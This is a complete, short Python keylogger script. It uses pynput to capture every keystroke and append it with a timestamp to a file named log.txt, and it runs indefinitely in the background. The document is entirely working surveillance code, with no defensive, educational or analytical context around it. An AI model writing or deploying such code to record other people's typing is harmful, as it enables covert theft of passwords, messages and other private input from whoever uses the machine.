from pynput.keyboard import Listener
import logging
from io import StringIO

logging.basicConfig(
  filename = ("log.txt"),
  level=logging.DEBUG,
  format='%(asctime)s: %(message)s' #adds timestamp
  )
def on_press(key):
  logging.info(str(key)) #convert key pressed into a string and logs it into a file
  
with Listener(on_press=on_press) as listener: #runs in background and wait for keyboard events indefinitely
  listener.join() 
